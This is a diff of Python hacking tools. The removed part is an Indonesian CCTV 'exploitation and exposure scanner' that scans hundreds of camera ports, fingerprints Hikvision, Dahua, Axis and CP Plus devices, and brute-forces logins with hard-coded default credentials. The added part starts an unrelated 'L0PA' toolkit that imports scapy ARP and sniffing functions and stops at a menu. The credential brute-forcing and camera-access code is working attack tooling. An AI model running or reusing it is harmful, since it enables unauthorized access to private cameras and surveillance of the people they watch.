@@ -1,1091 +1,1175 @@
-import requests
+# CODED BY L0PA :)
+
+import getpass
+import ipaddress
+import json
+import logging
+import os
+import random
+import tempfile
+import re
 import socket
+import subprocess
+import shutil
 import sys
 import threading
-import warnings
-from requests.auth import HTTPBasicAuth
-from xml.etree import ElementTree as ET
-import ipaddress
-from urllib.parse import urlparse
-import base64
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
 import time
+import urllib.request
+from queue import Queue
 
-# Suppress SSL warnings
-warnings.filterwarnings("ignore", message="Unverified HTTPS request")
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+import colorama
+import dns.resolver
+import requests
+import whois
+import shutil
+from colorama import Fore, Style
+from requests.structures import CaseInsensitiveDict
+from scapy.all import sniff, ARP, send, DNSQR, IP, getmacbyip, Ether, sendp, conf
 
-if sys.stdout.isatty():
-    R = '\033[31m'  # Red
-    G = '\033[32m'  # Green
-    C = '\033[36m'  # Cyan
-    W = '\033[0m'   # Reset
-    Y = '\033[33m'  # Yellow
-    M = '\033[35m'  # Magenta
-    B = '\033[34m'  # Blue
-else:
-    R = G = C = W = Y = M = B = ''  # No color in non-TTY environments
+import pyshorteners
+from urllib.parse import urlparse
 
-BANNER = rf"""
-{R}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⣸⣏⠛⠻⠿⣿⣶⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⣿⣿⣿⣷⣦⣤⣈⠙⠛⠿⣿⣷⣶⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣄⣈⠙⠻⠿⣿⣷⣶⣤⣀⡀⠀⠀⠀⠀⠀⠀
-⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣄⡉⠛⠻⢿⣿⣷⣶⣤⣀⠀⠀
-⠀⠀⠀⠉⠙⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣾⢻⣍⡉⠉⣿⠇⠀
-⠀⠀⠀⠀⠀⠀⠀⢹⡏⢹⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⣰⣿⣿⣾⠏⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠘⣿⠈⣿⠸⣯⠉⠛⠿⢿⣿⣿⣿⣿⡏⠀⠻⠿⣿⠇⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⢿⡆⢻⡄⣿⡀⠀⠀⠀⠈⠙⠛⠿⠿⠿⠿⠛⠋⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⢸⣧⠘⣇⢸⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⣀⣀⣿⣴⣿⢾⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⣴⡶⠾⠟⠛⠋⢹⡏⠀⢹⡇⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⢠⣿⠀⠀⠀⠀⢀⣈⣿⣶⠿⠿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⢸⣿⣴⠶⠞⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 
-  {G}[💀] AllLaluLintas - Eksploitasi Kamera & Pemindai Paparan
-  {C}[🔍] Temukan kamera CCTV terbuka & celah keamanan
-  {Y}[⚠️] Hanya untuk tujuan edukasi & riset keamanan!{W}
+############################################## SETTINGS FUNCTIONS ##################################################
 
-  {B}VERSION{W}  = 0.8.3
-  {B}Made By{W}  = Danxy
-"""
+username = getpass.getuser()
+colorama.init()
 
-# Common ports used by IP cameras and CCTV devices
-COMMON_PORTS = [
-    # Standard web ports
-    80, 443, 8080, 8443, 8000, 8001, 8008, 8081, 8082, 8083, 8084, 8085, 8086, 8087, 8088, 8089,
-    8090, 8091, 8092, 8093, 8094, 8095, 8096, 8097, 8098, 8099,
-    
-    # RTSP ports
-    554, 8554, 10554, 1554, 2554, 3554, 4554, 5554, 6554, 7554, 8554, 9554,
-    
-    # RTMP ports
-    1935, 1936, 1937, 1938, 1939,
-    
-    # Custom camera ports
-    37777, 37778, 37779, 37780, 37781, 37782, 37783, 37784, 37785, 37786, 37787, 37788, 37789, 37790,
-    37791, 37792, 37793, 37794, 37795, 37796, 37797, 37798, 37799, 37800,
-    
-    # ONVIF ports
-    3702, 3703, 3704, 3705, 3706, 3707, 3708, 3709, 3710,
-    
-    # VLC streaming ports
-    8080, 8090, 8100, 8110, 8120, 8130, 8140, 8150, 8160, 8170, 8180, 8190,
-    
-    # Common alternative ports
-    5000, 5001, 5002, 5003, 5004, 5005, 5006, 5007, 5008, 5009, 5010,
-    6000, 6001, 6002, 6003, 6004, 6005, 6006, 6007, 6008, 6009, 6010,
-    7000, 7001, 7002, 7003, 7004, 7005, 7006, 7007, 7008, 7009, 7010,
-    9000, 9001, 9002, 9003, 9004, 9005, 9006, 9007, 9008, 9009, 9010,
-    
-    # Additional common ports
-    8888, 8889, 8890, 8891, 8892, 8893, 8894, 8895, 8896, 8897, 8898, 8899,
-    9999, 9998, 9997, 9996, 9995, 9994, 9993, 9992, 9991, 9990,
-    
-    # MMS ports
-    1755, 1756, 1757, 1758, 1759, 1760,
-    
-    # Custom ranges
-    10000, 10001, 10002, 10003, 10004, 10005, 10006, 10007, 10008, 10009, 10010,
-    11000, 11001, 11002, 11003, 11004, 11005, 11006, 11007, 11008, 11009, 11010,
-    12000, 12001, 12002, 12003, 12004, 12005, 12006, 12007, 12008, 12009, 12010,
-    13000, 13001, 13002, 13003, 13004, 13005, 13006, 13007, 13008, 13009, 13010,
-    14000, 14001, 14002, 14003, 14004, 14005, 14006, 14007, 14008, 14009, 14010,
-    15000, 15001, 15002, 15003, 15004, 15005, 15006, 15007, 15008, 15009, 15010,
-    
-    # High ports commonly used by cameras
-    20000, 20001, 20002, 20003, 20004, 20005, 20006, 20007, 20008, 20009, 20010,
-    21000, 21001, 21002, 21003, 21004, 21005, 21006, 21007, 21008, 21009, 21010,
-    22000, 22001, 22002, 22003, 22004, 22005, 22006, 22007, 22008, 22009, 22010,
-    23000, 23001, 23002, 23003, 23004, 23005, 23006, 23007, 23008, 23009, 23010,
-    24000, 24001, 24002, 24003, 24004, 24005, 24006, 24007, 24008, 24009, 24010,
-    25000, 25001, 25002, 25003, 25004, 25005, 25006, 25007, 25008, 25009, 25010,
-    
-    # Additional custom ranges
-    30000, 30001, 30002, 30003, 30004, 30005, 30006, 30007, 30008, 30009, 30010,
-    31000, 31001, 31002, 31003, 31004, 31005, 31006, 31007, 31008, 31009, 31010,
-    32000, 32001, 32002, 32003, 32004, 32005, 32006, 32007, 32008, 32009, 32010,
-    33000, 33001, 33002, 33003, 33004, 33005, 33006, 33007, 33008, 33009, 33010,
-    34000, 34001, 34002, 34003, 34004, 34005, 34006, 34007, 34008, 34009, 34010,
-    35000, 35001, 35002, 35003, 35004, 35005, 35006, 35007, 35008, 35009, 35010,
-    36000, 36001, 36002, 36003, 36004, 36005, 36006, 36007, 36008, 36009, 36010,
-    37000, 37001, 37002, 37003, 37004, 37005, 37006, 37007, 37008, 37009, 37010,
-    38000, 38001, 38002, 38003, 38004, 38005, 38006, 38007, 38008, 38009, 38010,
-    39000, 39001, 39002, 39003, 39004, 39005, 39006, 39007, 39008, 39009, 39010,
-    40000, 40001, 40002, 40003, 40004, 40005, 40006, 40007, 40008, 40009, 40010,
-    41000, 41001, 41002, 41003, 41004, 41005, 41006, 41007, 41008, 41009, 41010,
-    42000, 42001, 42002, 42003, 42004, 42005, 42006, 42007, 42008, 42009, 42010,
-    43000, 43001, 43002, 43003, 43004, 43005, 43006, 43007, 43008, 43009, 43010,
-    44000, 44001, 44002, 44003, 44004, 44005, 44006, 44007, 44008, 44009, 44010,
-    45000, 45001, 45002, 45003, 45004, 45005, 45006, 45007, 45008, 45009, 45010,
-    46000, 46001, 46002, 46003, 46004, 46005, 46006, 46007, 46008, 46009, 46010,
-    47000, 47001, 47002, 47003, 47004, 47005, 47006, 47007, 47008, 47009, 47010,
-    48000, 48001, 48002, 48003, 48004, 48005, 48006, 48007, 48008, 48009, 48010,
-    49000, 49001, 49002, 49003, 49004, 49005, 49006, 49007, 49008, 49009, 49010,
-    50000, 50001, 50002, 50003, 50004, 50005, 50006, 50007, 50008, 50009, 50010,
-    51000, 51001, 51002, 51003, 51004, 51005, 51006, 51007, 51008, 51009, 51010,
-    52000, 52001, 52002, 52003, 52004, 52005, 52006, 52007, 52008, 52009, 52010,
-    53000, 53001, 53002, 53003, 53004, 53005, 53006, 53007, 53008, 53009, 53010,
-    54000, 54001, 54002, 54003, 54004, 54005, 54006, 54007, 54008, 54009, 54010,
-    55000, 55001, 55002, 55003, 55004, 55005, 55006, 55007, 55008, 55009, 55010,
-    56000, 56001, 56002, 56003, 56004, 56005, 56006, 56007, 56008, 56009, 56010,
-    57000, 57001, 57002, 57003, 57004, 57005, 57006, 57007, 57008, 57009, 57010,
-    58000, 58001, 58002, 58003, 58004, 58005, 58006, 58007, 58008, 58009, 58010,
-    59000, 59001, 59002, 59003, 59004, 59005, 59006, 59007, 59008, 59009, 59010,
-    60000, 60001, 60002, 60003, 60004, 60005, 60006, 60007, 60008, 60009, 60010,
-    61000, 61001, 61002, 61003, 61004, 61005, 61006, 61007, 61008, 61009, 61010,
-    62000, 62001, 62002, 62003, 62004, 62005, 62006, 62007, 62008, 62009, 62010,
-    63000, 63001, 63002, 63003, 63004, 63005, 63006, 63007, 63008, 63009, 63010,
-    64000, 64001, 64002, 64003, 64004, 64005, 64006, 64007, 64008, 64009, 64010,
-    65000, 65001, 65002, 65003, 65004, 65005, 65006, 65007, 65008, 65009, 65010
-]
 
-# Common admin login pages or interesting paths for cameras
-COMMON_PATHS = [
-    "/", "/admin", "/login", "/viewer", "/webadmin", "/video", "/stream", "/live", "/snapshot", "/onvif-http/snapshot",
-    "/system.ini", "/config", "/setup", "/cgi-bin/", "/api/", "/camera", "/img/main.cgi"
-]
 
-# Default credentials commonly used in IP cameras
-DEFAULT_CREDENTIALS = {
-    "admin": ["admin", "1234", "admin123", "password", "12345", "123456", "1111", "default"],
-    "root": ["root", "toor", "1234", "pass", "root123"],
-    "user": ["user", "user123", "password"],
-    "guest": ["guest", "guest123"],
-    "operator": ["operator", "operator123"],
-}
-
-# New constants
-HTTPS_PORTS = [443, 8443, 8444]
-HEADERS = {
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
-}
-TIMEOUT = 5
-PORT_SCAN_TIMEOUT = 1.5
-
-# Enhanced CVE database
-CVE_DATABASE = {
-    "hikvision": [
-        "CVE-2021-36260", "CVE-2017-7921", "CVE-2021-31955", "CVE-2021-31956",
-        "CVE-2021-31957", "CVE-2021-31958", "CVE-2021-31959", "CVE-2021-31960",
-        "CVE-2021-31961", "CVE-2021-31962", "CVE-2021-31963", "CVE-2021-31964"
-    ],
-    "dahua": [
-        "CVE-2021-33044", "CVE-2022-30563", "CVE-2021-33045", "CVE-2021-33046",
-        "CVE-2021-33047", "CVE-2021-33048", "CVE-2021-33049", "CVE-2021-33050",
-        "CVE-2021-33051", "CVE-2021-33052", "CVE-2021-33053", "CVE-2021-33054"
-    ],
-    "axis": [
-        "CVE-2018-10660", "CVE-2020-29550", "CVE-2020-29551", "CVE-2020-29552",
-        "CVE-2020-29553", "CVE-2020-29554", "CVE-2020-29555", "CVE-2020-29556",
-        "CVE-2020-29557", "CVE-2020-29558", "CVE-2020-29559", "CVE-2020-29560"
-    ],
-    "cp plus": [
-        "CVE-2021-XXXXX", "CVE-2022-XXXXX", "CVE-2023-XXXXX"
-    ]
-}
-
-# Thread control
-threads_running = True
-
-def print_search_urls(ip):
-    print(f"\n[🌍] {C}Use these URLs to check the camera exposure manually:{W}")
-    print(f"  🔹 Shodan: https://www.shodan.io/search?query={ip}")
-    print(f"  🔹 Censys: https://search.censys.io/hosts/{ip}")
-    print(f"  🔹 Zoomeye: https://www.zoomeye.org/searchResult?q={ip}")
-    print(f"  🔹 Google Dorking (Quick Search): https://www.google.com/search?q=site:{ip}+inurl:view/view.shtml+OR+inurl:admin.html+OR+inurl:login")
-
-def google_dork_search(ip):
-    print(f"\n[🔎] {C}Google Dorking Suggestions:{W}")
-    queries = [
-        f"site:{ip} inurl:view/view.shtml",
-        f"site:{ip} inurl:admin.html",
-        f"site:{ip} inurl:login",
-        f"intitle:'webcam' inurl:{ip}",
-    ]
-    for q in queries:
-        print(f"  🔍 Google Dork: https://www.google.com/search?q={q.replace(' ', '+')}")
-
-def get_ip_location_info(ip):
-    """Get comprehensive IP and location information"""
-    print(f"\n{C}[🌍] IP and Location Information:{W}")
+def check_distro():
     try:
-        response = requests.get(f"https://ipinfo.io/{ip}/json")
-        if response.status_code == 200:
-            data = response.json()
-            
-            # Basic IP Information
-            print(f"  🔍 IP: {data.get('ip', 'N/A')}")
-            print(f"  🏢 ISP: {data.get('org', 'N/A')}")
-            
-            # Location Information
-            if 'loc' in data:
-                lat, lon = data['loc'].split(',')
-                print(f"\n  📍 Coordinates:")
-                print(f"    Latitude: {lat}")
-                print(f"    Longitude: {lon}")
-                print(f"    🔗 Google Maps: https://www.google.com/maps?q={lat},{lon}")
-                print(f"    🔗 Google Earth: https://earth.google.com/web/@{lat},{lon},0a,1000d,35y,0h,0t,0r")
-            
-            # Geographic Information
-            print(f"\n  🌎 Geographic Details:")
-            print(f"    City: {data.get('city', 'N/A')}")
-            print(f"    Region: {data.get('region', 'N/A')}")
-            print(f"    Country: {data.get('country', 'N/A')}")
-            print(f"    Postal Code: {data.get('postal', 'N/A')}")
-            
-            # Timezone Information
-            if 'timezone' in data:
-                print(f"\n  ⏰ Timezone: {data['timezone']}")
-            
-        else:
-            print(f"{R}[!] Failed to fetch IP information.{W}")
-    except Exception as e:
-        print(f"{R}[!] Error getting IP information: {str(e)}{W}")
-
-def validate_ip(target_ip):
-    try:
-        ip = ipaddress.ip_address(target_ip)
-        if ip.is_private:
-            print(f"{R}[!] Warning: Private IP address detected. This tool is meant for public IPs.{W}")
-        return True
-    except ValueError:
-        print(f"{R}[!] Invalid IP address format{W}")
-        return False
-
-def get_protocol(port):
-    return "https" if port in HTTPS_PORTS else "http"
-
-def check_ports(ip):
-    print(f"\n[🔍] {C}Scanning comprehensive CCTV ports on IP:{W}", ip)
-    print(f"{Y}[⚠️] This will scan {len(COMMON_PORTS)} ports. This may take a while...{W}")
-    open_ports = []
-    lock = threading.Lock()
-    scanned_count = 0
-
-    def scan_port(port):
-        nonlocal scanned_count
-        if not threads_running:
-            return
-        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
-            sock.settimeout(PORT_SCAN_TIMEOUT)
-            try:
-                if sock.connect_ex((ip, port)) == 0:
-                    with lock:
-                        open_ports.append(port)
-                        print(f"  ✅ Port {port} OPEN!")
-                else:
-                    with lock:
-                        scanned_count += 1
-                        if scanned_count % 50 == 0:  # Progress indicator every 50 ports
-                            print(f"  📊 Scanned {scanned_count}/{len(COMMON_PORTS)} ports...")
-            except:
-                with lock:
-                    scanned_count += 1
-
-    # Use more threads for faster scanning
-    max_threads = 100  # Increased thread count
-    threads = []
-    
-    for i, port in enumerate(COMMON_PORTS):
-        thread = threading.Thread(target=scan_port, args=(port,))
-        thread.daemon = True
-        threads.append(thread)
-        thread.start()
-        
-        # Limit concurrent threads to avoid overwhelming the system
-        if len(threads) >= max_threads:
-            for t in threads:
-                t.join()
-            threads = []
-
-    # Wait for remaining threads
-    for thread in threads:
-        thread.join()
-
-    print(f"\n{Y}[📊] Scan completed: {scanned_count} ports checked, {len(open_ports)} ports open{W}")
-    return sorted(open_ports)
-
-def check_if_camera(ip, open_ports):
-    """Enhanced camera detection with detailed port analysis"""
-    print(f"\n{C}[📷] Analyzing Ports for Camera Indicators:{W}")
-    camera_indicators = False
-    
-    # Common camera server headers and keywords
-    camera_servers = {
-        'hikvision': ['hikvision', 'dvr', 'nvr'],
-        'dahua': ['dahua', 'dvr', 'nvr'],
-        'axis': ['axis', 'axis communications'],
-        'sony': ['sony', 'ipela'],
-        'bosch': ['bosch', 'security systems'],
-        'samsung': ['samsung', 'samsung techwin'],
-        'panasonic': ['panasonic', 'network camera'],
-        'vivotek': ['vivotek', 'network camera'],
-        'cp plus': ['cp plus', 'cp-plus', 'cpplus', 'cp_plus'],
-        'generic': ['camera', 'webcam', 'surveillance', 'ip camera', 'network camera', 'dvr', 'nvr', 'recorder']
-    }
-    
-    # Common camera content types
-    camera_content_types = [
-        'image/jpeg',
-        'image/mjpeg',
-        'video/mpeg',
-        'video/mp4',
-        'video/h264',
-        'application/x-mpegURL',
-        'video/MP2T',
-        'application/octet-stream',
-        'text/html',
-        'application/json'
-    ]
-    
-    def analyze_port(port):
-        nonlocal camera_indicators
-        protocol = get_protocol(port)
-        base_url = f"{protocol}://{ip}:{port}"
-        
-        print(f"\n  🔍 Analyzing Port {port} ({protocol.upper()}):")
-        
-        # Check server headers and response
-        try:
-            response = requests.get(base_url, headers=HEADERS, timeout=TIMEOUT, verify=False)
-            server_header = response.headers.get('Server', '').lower()
-            content_type = response.headers.get('Content-Type', '').lower()
-            
-            # Check server headers for camera brands
-            brand_found = False
-            for brand, keywords in camera_servers.items():
-                if any(keyword in server_header for keyword in keywords):
-                    print(f"    ✅ {brand.upper()} Camera Server Detected")
-                    brand_found = True
-                    camera_indicators = True
-                    break
-            
-            # Check content type
-            if any(ct in content_type for ct in camera_content_types):
-                print(f"    ✅ Camera Content Type: {content_type}")
-                camera_indicators = True
-            
-            # Check response content for camera indicators
-            if response.status_code == 200:
-                content = response.text.lower()
-                camera_keywords = ['camera', 'webcam', 'surveillance', 'stream', 'video', 'snapshot', 'dvr', 'nvr', 'recorder', 'cctv']
-                found_keywords = [kw for kw in camera_keywords if kw in content]
-                if found_keywords:
-                    print(f"    ✅ Camera Keywords Found: {', '.join(found_keywords)}")
-                    camera_indicators = True
-                
-                # Check for specific CP Plus indicators
-                if any(x in content for x in ['cp plus', 'cp-plus', 'cpplus', 'cp_plus', 'uvr', '0401e1']):
-                    print(f"    ✅ CP Plus Camera Detected!")
-                    camera_indicators = True
-            
-            # Check common camera endpoints
-            endpoints = ['/video', '/stream', '/snapshot', '/cgi-bin', '/admin', '/viewer', '/login', '/index.html', '/']
-            for endpoint in endpoints:
-                try:
-                    endpoint_url = f"{base_url}{endpoint}"
-                    endpoint_response = requests.head(endpoint_url, headers=HEADERS, timeout=TIMEOUT, verify=False)
-                    if endpoint_response.status_code in [200, 401, 403]:
-                        print(f"    ✅ Camera Endpoint Found: {endpoint_url} (HTTP {endpoint_response.status_code})")
-                        camera_indicators = True
-                except:
-                    continue
-            
-            # Print server information
-            if server_header:
-                print(f"    ℹ️ Server: {server_header}")
-            print(f"    ℹ️ Status Code: {response.status_code}")
-            
-            # Check for authentication
-            if response.status_code == 401:
-                print(f"    🔐 Authentication Required")
-                auth_type = response.headers.get('WWW-Authenticate', '')
-                if auth_type:
-                    print(f"    🔐 Auth Type: {auth_type}")
-            
-            # Additional checks for DVR/NVR devices
-            if response.status_code == 200:
-                # Check for common DVR/NVR page titles
-                if '<title>' in content:
-                    title_start = content.find('<title>') + 7
-                    title_end = content.find('</title>', title_start)
-                    if title_end > title_start:
-                        title = content[title_start:title_end].lower()
-                        if any(x in title for x in ['dvr', 'nvr', 'recorder', 'surveillance', 'cctv', 'camera']):
-                            print(f"    ✅ DVR/NVR Page Title: {title}")
-                            camera_indicators = True
-                
-                # Check for common DVR/NVR form fields
-                if any(x in content for x in ['username', 'password', 'login', 'admin']):
-                    print(f"    ✅ Login Form Detected")
-                    camera_indicators = True
-                
-                # Check for specific CP Plus model indicators
-                if any(x in content for x in ['uvr-0401e1', 'uvr0401e1', '0401e1']):
-                    print(f"    ✅ CP Plus UVR-0401E1 Model Detected!")
-                    camera_indicators = True
-            
-        except requests.exceptions.RequestException as e:
-            print(f"    ❌ Connection Error: {str(e)}")
-        except Exception as e:
-            print(f"    ❌ Error: {str(e)}")
-    
-    # Analyze each port
-    for port in open_ports:
-        analyze_port(port)
-    
-    return camera_indicators
-
-def check_login_pages(ip, open_ports):
-    print(f"\n[🔍] {C}Checking for authentication pages:{W}")
-    found_urls = []
-    lock = threading.Lock()
-    
-    def check_endpoint(port, path):
-        protocol = get_protocol(port)
-        url = f"{protocol}://{ip}:{port}{path}"
-        try:
-            response = requests.head(url, headers=HEADERS, timeout=TIMEOUT, verify=False)
-            if response.status_code in [200, 401, 403]:
-                with lock:
-                    found_urls.append(url)
-                    print(f"  ✅ Found login page: {url} (HTTP {response.status_code})")
-                return url
-        except Exception as e:
-            pass
-        return None
-
-    # Use threading for faster checking
-    threads = []
-    max_concurrent = 50  # Limit concurrent threads
-    
-    for port in open_ports:
-        for path in COMMON_PATHS:
-            thread = threading.Thread(target=check_endpoint, args=(port, path))
-            thread.daemon = True
-            threads.append(thread)
-            thread.start()
-            
-            # Limit concurrent threads to avoid overwhelming
-            if len(threads) >= max_concurrent:
-                for t in threads:
-                    t.join()
-                threads = []
-    
-    # Wait for remaining threads
-    for thread in threads:
-        thread.join()
-    
-    if not found_urls:
-        print("  ❌ No authentication pages detected")
-    else:
-        print(f"  📊 Found {len(found_urls)} authentication pages")
-
-def test_default_passwords(ip, open_ports):
-    print(f"\n[🔑] {C}Testing common credentials:{W}")
-    found = False
-    lock = threading.Lock()
-    
-    def test_credentials(protocol, port, path, auth_type):
-        nonlocal found
-        if found:  # Early termination if credentials already found
-            return False
-            
-        url = f"{protocol}://{ip}:{port}{path}"
-        for username, passwords in DEFAULT_CREDENTIALS.items():
-            if found:  # Check again for early termination
-                return False
-            for password in passwords:
-                if found:  # Check again for early termination
-                    return False
-                try:
-                    if auth_type == "basic":
-                        response = requests.get(url, auth=(username, password), 
-                                            headers=HEADERS, timeout=TIMEOUT, verify=False)
-                    elif auth_type == "form":
-                        response = requests.post(url, data={'username': username, 'password': password},
-                                                headers=HEADERS, timeout=TIMEOUT, verify=False)
-                    
-                    if response.status_code == 200:
-                        with lock:
-                            if not found:  # Double-check to avoid duplicate prints
-                                found = True
-                                print(f"🔥 Success! {username}:{password} @ {url}")
-                        return True
-                except:
-                    pass
-        return False
-
-    # Test endpoints with threading
-    threads = []
-    max_concurrent = 20  # Lower limit for credential testing
-    
-    for port in open_ports:
-        if found:  # Early termination
-            break
-        protocol = get_protocol(port)
-        endpoints = [
-            ("/", "basic"),
-            ("/login", "form"),
-            ("/admin/login", "form"),
-            ("/cgi-bin/login", "form")
-        ]
-        
-        for path, auth_type in endpoints:
-            if found:  # Early termination
-                break
-            thread = threading.Thread(target=test_credentials, args=(protocol, port, path, auth_type))
-            thread.daemon = True
-            threads.append(thread)
-            thread.start()
-            
-            # Limit concurrent threads
-            if len(threads) >= max_concurrent:
-                for t in threads:
-                    t.join()
-                threads = []
-    
-    # Wait for remaining threads
-    for thread in threads:
-        thread.join()
-    
-    if not found:
-        print("❌ No default credentials found")
-
-def try_default_credentials(ip, port):
-    """Attempt to find working credentials for fingerprinting"""
-    for username, passwords in DEFAULT_CREDENTIALS.items():
-        for password in passwords:
-            try:
-                response = requests.get(
-                    f"http://{ip}:{port}/",
-                    auth=(username, password),
-                    headers=HEADERS,
-                    timeout=TIMEOUT,
-                    verify=False
-                )
-                if response.status_code == 200:
-                    return f"{username}:{password}"
-            except:
-                pass
-    return None
-
-def search_cve(brand):
-    """Enhanced CVE lookup functionality"""
-    print(f"\n[🛡️] Checking known CVEs for {brand.capitalize()}:")
-    if cves := CVE_DATABASE.get(brand.lower()):
-        for cve in cves:
-            print(f"  🔗 https://nvd.nist.gov/vuln/detail/{cve}")
-    else:
-        print("  ℹ️ No common CVEs found for this brand")
-
-def fingerprint_camera(ip, open_ports):
-    print(f"\n[📡] {C}Scanning for Camera Type & Firmware:{W}")
-    for port in open_ports:
-        protocol = get_protocol(port)
-        url_base = f"{protocol}://{ip}:{port}"
-        print(f"🔍 Checking {url_base}...")
-        try:
-            resp = requests.get(url_base, headers=HEADERS, timeout=TIMEOUT, verify=False)
-            server_header = resp.headers.get("server", "").lower()
-            content = resp.text.lower()
-            
-            if "hikvision" in server_header:
-                print("🔥 Hikvision Camera Detected!")
-                fingerprint_hikvision(ip, port)
-            elif "dahua" in server_header:
-                print("🔥 Dahua Camera Detected!")
-                fingerprint_dahua(ip, port)
-            elif "axis" in server_header:
-                print("🔥 Axis Camera Detected!")
-                fingerprint_axis(ip, port)
-            elif any(x in content for x in ['cp plus', 'cp-plus', 'cpplus', 'cp_plus', 'uvr', '0401e1']):
-                print("🔥 CP Plus Camera Detected!")
-                fingerprint_cp_plus(ip, port)
+        with open("/etc/os-release") as f:
+            distro = f.read().lower()
+            if "debian" in distro or "ubuntu" in distro:
+                return "debian_based"
+            elif "fedora" in distro or "rhel" in distro or "centos" in distro:
+                return "fedora_based"
+            elif "arch" in distro or "manjaro" in distro:
+                return "arch_based"
             else:
-                print("❓ Unknown Camera Type")
-                fingerprint_generic(ip, port)
-        except:
-            print("❌ No response")
+                return "other_os"
+    except FileNotFoundError:
+        return "unknown"
 
-def fingerprint_hikvision(ip, port):
-    print("➡️  Attempting Hikvision Fingerprint...")
-    protocol = get_protocol(port)
-    credentials = try_default_credentials(ip, port) or "admin:1234"
-    auth_b64 = base64.b64encode(credentials.encode()).decode()
-    
-    endpoints = [
-        f"{protocol}://{ip}:{port}/System/configurationFile?auth={auth_b64}",
-        f"{protocol}://{ip}:{port}/ISAPI/System/deviceInfo"
-    ]
-    
-    for url in endpoints:
-        try:
-            resp = requests.get(url, headers=HEADERS, timeout=TIMEOUT, verify=False)
-            if resp.status_code == 401:
-                print(f"⚠️ Authentication failed for {url}")
-                continue
-            if resp.status_code == 200:
-                print(f"✅ Found at {url}")
-                if "configurationFile" in url:
-                    try:
-                        xml_root = ET.fromstring(resp.text)
-                        model = xml_root.findtext(".//model")
-                        firmware = xml_root.findtext(".//firmwareVersion")
-                        if model:
-                            print(f"📸 Model: {model}")
-                        if firmware:
-                            print(f"🛡️ Firmware: {firmware}")
-                    except ET.ParseError:
-                        print("⚠️ Cannot parse XML configuration")
-                else:
-                    print(resp.text)
-        except Exception as e:
-            print(f"⚠️ {e}")
-    search_cve("hikvision")
 
-def fingerprint_dahua(ip, port):
-    print("➡️  Attempting Dahua Fingerprint...")
-    protocol = get_protocol(port)
+
+def is_command_available(cmd):
+    return shutil.which(cmd) is not None
+
+
+def close_program():
+    text_animation(f"\n{Fore.RED} [💀] Closing The Program...{Style.RESET_ALL}\n", 0.02)
+    sys.exit()
+
+
+def is_command_available(cmd):
+    result = subprocess.run(['which', cmd], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    return result.returncode == 0
+
+
+def command_exist(cmd):
+    return shutil.which(cmd) is not None
+    
+
+title = f"""{Fore.CYAN}
+ ██╗      ██████╗ ██████╗ ██╗  ██╗    ████████╗ ██████╗  ██████╗ ██╗     ██╗  ██╗██╗████████╗
+ ██║     ██╔═████╗██╔══██╗██║  ██║    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██║ ██╔╝██║╚══██╔══╝
+ ██║     ██║██╔██║██████╔╝███████║       ██║   ██║   ██║██║   ██║██║     █████╔╝ ██║   ██║   
+ ██║     ████╔╝██║██╔═══╝ ╚════██║       ██║   ██║   ██║██║   ██║██║     ██╔═██╗ ██║   ██║   
+ ███████╗╚██████╔╝██║          ██║       ██║   ╚██████╔╝╚██████╔╝███████╗██║  ██╗██║   ██║   
+ ╚══════╝ ╚═════╝ ╚═╝          ╚═╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝   
+                                                                                                                                                                 
+{Style.RESET_ALL}"""
+
+def text_animation(text, ms):
+    for word in text:
+        print(word, end='', flush=True)
+        time.sleep(ms)
+
+
+def menu_intro(section_name):
+    clear()
+    text_animation(title,0.0005)
+    text_animation(f"                                \033[1;37mCreated by \033[1;31mL0pa 💻\033[0m\n", 0.0005)
+    text_animation(f"{Fore.CYAN} \t\t\t\tTikTok: {Style.RESET_ALL}{Fore.LIGHTBLUE_EX}@_.l0pa._\n\n{Style.RESET_ALL}", 0.0005)
+    print(f"\n{Fore.LIGHTCYAN_EX} --- {section_name} ---{Style.RESET_ALL}\n")
+
+
+def clear():
+    os.system('cls' if os.name == 'nt' else 'clear')
+    
+    
+def windows():
+    clear()
+    text_animation(title, 0.0005)
+    text_animation(f"                                \033[1;37mCreated by \033[1;31mL0pa 💻\033[0m\n", 0.0005)
+    text_animation(f"{Fore.CYAN} \t\t\t\tTikTok: {Style.RESET_ALL}{Fore.LIGHTBLUE_EX}@_.l0pa._\n{Style.RESET_ALL}", 0.0005)
+    
+    menu = f"""
+        {Fore.GREEN}{Style.BRIGHT}┌{'─'*50}┐
